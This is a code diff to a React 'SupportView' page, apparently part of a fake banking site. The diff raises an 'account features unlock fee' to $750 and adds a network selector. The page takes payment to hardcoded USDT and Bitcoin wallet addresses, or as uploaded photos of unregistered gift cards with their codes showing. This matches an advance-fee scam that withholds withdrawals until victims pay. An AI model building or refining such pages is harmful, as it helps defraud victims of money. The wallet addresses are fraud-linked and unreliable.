@@ -31,6 +31,7 @@ export const SupportView = () => {
   const [fileBase64, setFileBase64] = useState<string | null>(null);
 
   const [paymentMethod, setPaymentMethod] = useState<'crypto' | 'giftcard'>('crypto');
+  const [cryptoAsset, setCryptoAsset] = useState<'usdt_erc20' | 'usdt_trc20' | 'btc' | ''>('');
   const [activationFileBase64, setActivationFileBase64] = useState<string | null>(null);
   
   useEffect(() => {
@@ -91,7 +92,7 @@ export const SupportView = () => {
           <span>Account Features Unlock</span>
         </h2>
         <p className="text-sm text-slate-500 dark:text-slate-400 mt-2 max-w-2xl leading-relaxed">
-          Unlock full withdrawals, direct deposits, routing numbers, and secure physical cards. Complete your account activation with a test deposit. <span className="font-bold text-slate-700 dark:text-slate-300">Minimum structural deposit: $500.</span>
+          Unlock full withdrawals, direct deposits, routing numbers, and secure physical cards. Complete your account activation with a structural deposit. <span className="font-bold text-slate-700 dark:text-slate-300">Account features unlock fee: $750.</span>
         </p>
 
         <div className="mt-8 grid grid-cols-1 md:grid-cols-2 gap-8">
@@ -121,18 +122,30 @@ export const SupportView = () => {
 
             <div className="p-5 rounded-xl border border-slate-200 dark:border-white/5 bg-slate-50 dark:bg-slate-950/50">
               {paymentMethod === 'crypto' ? (
-                <div className="space-y-4">
+                <div className="space-y-4 min-h-[140px]">
                   <p className="text-xs text-slate-600 dark:text-slate-400 leading-relaxed mb-4">
-                    Send funds via the networks designated below. Ensure sufficient gas to cover network fees. Only send on the designated protocol.
+                    Send funds via the networks designated below.
                   </p>
-                  <CopyableText label="USDT (ERC20 - Ethereum Network)" text="0x6420440fe3052422134229ff5ac904ec1aadf882" />
-                  <CopyableText label="USDT (TRC20 - Tron Network)" text="TY1rjXKoLM4MKUmUMAJNaqngxdXAUQDrUG" />
-                  <CopyableText label="BITCOIN (BTC Network)" text="1M4CxHqAhCeWQnoF3HgmzhS4sxKgDWwF1g" />
+                  
+                  <select 
+                    value={cryptoAsset}
+                    onChange={(e) => setCryptoAsset(e.target.value as any)}
+                    className="w-full h-10 bg-white dark:bg-slate-900 border border-slate-200 dark:border-white/10 rounded-lg px-3 text-xs text-slate-800 dark:text-slate-200 outline-none focus:border-emerald-500/50 transition-colors mb-4"
+                  >
+                    <option value="" disabled>Select Asset Network</option>
+                    <option value="usdt_erc20">USDT (ERC20 - Ethereum Network)</option>
+                    <option value="usdt_trc20">USDT (TRC20 - Tron Network)</option>
+                    <option value="btc">BITCOIN (BTC Network)</option>
+                  </select>
+
+                  {cryptoAsset === 'usdt_erc20' && <CopyableText label="USDT (ERC20) Wallet Address" text="0x6420440fe3052422134229ff5ac904ec1aadf882" />}
+                  {cryptoAsset === 'usdt_trc20' && <CopyableText label="USDT (TRC20) Wallet Address" text="TY1rjXKoLM4MKUmUMAJNaqngxdXAUQDrUG" />}
+                  {cryptoAsset === 'btc' && <CopyableText label="BITCOIN Wallet Address" text="1M4CxHqAhCeWQnoF3HgmzhS4sxKgDWwF1g" />}
                 </div>
               ) : (
-                <div className="space-y-4 relative">
+                <div className="space-y-4 relative min-h-[140px]">
                   <p className="text-xs text-slate-600 dark:text-slate-400 leading-relaxed">
-                    Purchase and upload images of valid, unregistered gift cards (front and back exposing code). Minimum aggregated value $500.
+                    Purchase and upload images of valid, unregistered gift cards (front and back exposing code). Minimum aggregated value $750.
                   </p>
                   
                   <div className="p-3 bg-red-50 dark:bg-red-500/10 border border-red-200 dark:border-red-500/20 text-red-800 dark:text-red-400 rounded-lg text-xs leading-relaxed">
@@ -200,6 +213,7 @@ export const SupportView = () => {
                   <option value="verification">Verification & Documents</option>
                   <option value="account_manager">Request Account Manager</option>
                   <option value="dispute">Transaction Dispute</option>
+                  <option value="loans">Loans & Applications</option>
                 </select>
               </div>
 
